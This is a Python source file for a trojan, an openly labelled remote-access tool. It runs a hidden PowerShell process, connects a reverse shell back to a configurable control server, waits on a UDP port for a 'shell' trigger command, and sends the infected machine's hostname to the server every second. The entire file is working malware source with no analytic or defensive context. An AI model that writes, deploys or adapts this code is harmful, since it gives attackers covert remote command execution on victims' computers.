from socket import socket, gethostname, AF_INET, SOCK_STREAM, SOCK_DGRAM
from subprocess import Popen, PIPE, STDOUT
from multiprocessing import Process, Value
from threading import Thread
from time import sleep


def _reverse_shell(server_ip: str, port: int, interrupt: Value):
    server = socket(AF_INET, SOCK_STREAM)
    interrupt = interrupt
    shell = Popen(
            ["powershell.exe"],
            stdout=PIPE,
            stderr=STDOUT,
            stdin=PIPE,
            shell=True,
            text=True
    )
    print(f'shell pid: {shell.pid}')
    server.connect((server_ip, port))

    def s2p(s, p):
        try:
            while True:
                data = s.recv(1024).decode()
                if len(data) > 0:
                    print(f'received from sever:{data}')
                    p.stdin.write(f'{data}\n')
                    p.stdin.flush()
        except ConnectionError:
            interrupt.value = 1

    def p2s(s, p):
        try:
            while True:
                data = p.stdout.readline().encode()
                if len(data) > 0:
                    print(f'sent to sever:{data}')
                    s.sendall(data)
        except ConnectionError:
            interrupt.value = 1

    Thread(target=s2p, args=(server, shell)).start()
    Thread(target=p2s, args=(server, shell)).start()


class Trojan:
    def __init__(self, server_ip: str, shell_port: int, communication_port: int, heartbeat_port: int):
        self.server_ip = server_ip
        self.ports = {
            'shell': shell_port,
            'communication': communication_port,
            'heartbeat': heartbeat_port,
        }
        print(
                f'Bound to server:\n'
                f'\tserver_ip: {server_ip}\n'
                f'\tshell_port: {shell_port}\n'
                f'\tcommunication_port: {communication_port}\n'
        )

    def run(self):
        communication_socket = socket(AF_INET, SOCK_DGRAM)
        communication_socket.bind(('', self.ports['communication']))
        Thread(target=self._heartbeat, daemon=True).start()
        print('Started Listening')
        while True:
            try:
                msg = communication_socket.recv(1024)
                print(f'received message: {msg}')
                if msg == b'shell':
                    interrupt = Value('b', 0)
                    proc = Process(
                            target=_reverse_shell,
                            args=(self.server_ip, self.ports['shell'], interrupt)
                    )
                    proc.start()
                    print('Shell activated')
                    while not interrupt.value:
                        pass
                    proc.kill()
                    print('Shell terminated')
            except Exception as e:
                print(e)
                communication_socket.sendto(str(e).encode(), (self.server_ip, self.ports['communication']))

    def _heartbeat(self):
        heartbeat_socket = socket(AF_INET, SOCK_DGRAM)
        while True:
            try:
                heartbeat_socket.sendto(gethostname().encode(), (self.server_ip, self.ports['heartbeat']))
            except OSError:
                pass
            sleep(1)


if __name__ == '__main__':
    trojan = Trojan(
            server_ip='localhost',
            shell_port=36555,
            communication_port=36556,
            heartbeat_port=36557,
    )
    trojan.run()
